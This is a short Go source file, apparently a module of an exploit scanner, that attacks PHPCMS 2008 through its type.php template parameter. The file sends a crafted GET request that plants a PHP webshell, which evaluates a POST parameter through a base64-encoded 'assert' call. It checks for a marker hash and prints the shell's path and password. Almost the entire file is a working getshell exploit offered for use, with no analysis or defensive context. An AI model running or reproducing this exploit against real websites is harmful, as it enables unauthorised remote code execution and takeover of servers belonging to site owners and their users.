package phpcms

import (
  "../../config"
  "../../WebRequest"
  "fmt"
  "strings"
)

func Phpcms2008_type_getshell(Info *config.Info)(Result config.Result){
  Info.Payload = "/type.php?template=tag_(){};@unlink(_FILE_);echo%20md5(lings);$ant=base64_decode(YXNzZXJ0);$ant($_POST["+Info.ShellPassword+"]);{//../rss"
  Info.Request_Type = "GET"
  Info.Cookie = ""
  Result=WebRequest.Request(Info)

  if strings.Index(Result.Body, "24c10be286b009f797d53126790fcfd8")>0 && Result.StatusCode==200 {
  	fmt.Printf("Webshll地址：%s/data/cache_template/rss.tpl.php   password：%s",Info.Url,Info.ShellPassword)
  	return
  }
  return
}